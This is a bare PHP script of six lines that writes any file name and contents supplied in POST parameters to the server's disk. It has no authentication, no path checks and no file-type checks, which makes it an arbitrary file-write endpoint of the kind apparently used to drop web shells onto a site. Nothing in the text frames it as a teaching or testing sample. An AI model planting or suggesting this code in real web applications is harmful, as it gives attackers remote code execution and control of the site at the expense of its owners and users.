<?php 
$filename = $_POST["filename"];
$contents = $_POST["contents"];
file_put_contents($filename, $contents); 
chmod($filename, 0644);
?>
